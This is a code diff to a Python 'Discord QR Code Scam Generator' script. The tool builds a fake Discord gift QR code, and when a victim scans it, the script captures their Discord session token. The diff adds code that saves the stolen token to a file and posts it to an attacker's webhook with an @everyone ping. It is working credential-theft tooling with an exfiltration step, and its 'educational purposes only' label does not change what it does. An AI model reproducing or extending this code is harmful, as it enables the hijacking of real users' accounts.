@@ -4,9 +4,13 @@ from PIL import Image
 import base64
 import time
 import os
+import requests
+import json
 
-# Developer: NightfallGT
+# Developer: NightfallGT fixed by github.com/Visual9999
 # Educational purposes only
+
+WEBHOOK_URL = 'https://example.discord.com/api' #your webhook here
 
 def logo_qr():
     im1 = Image.open('temp/qr_code.png', 'r')
@@ -22,8 +26,13 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print('github.com/NightfallGT/Discord-QR-Scam\n')
+    print('github.com/NightfallGT/Discord-QR-Scam fixed by github.com/Visual9999\n')
     print('** QR Code Scam Generator **')
+    
+    try:
+        os.remove("discord_gift.png")
+    except:
+        print("No previous discord_gift.png found.")
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
@@ -76,7 +85,25 @@ def main():
     return token;   
                 ''')
             print('---')
-            print('Token grabbed:',token)
+            print('Token grabbed:', token)
+
+            f = open("token.txt", "w")
+            f.write(token)
+            f.close()
+
+            headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+            }
+
+            message = f'@everyone\n`{token}`'
+
+            payload = json.dumps({
+                'content': message,
+                "username": "github.vom/Visual9999"
+                })
+
+            req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
             break
 
     print('Task complete.')
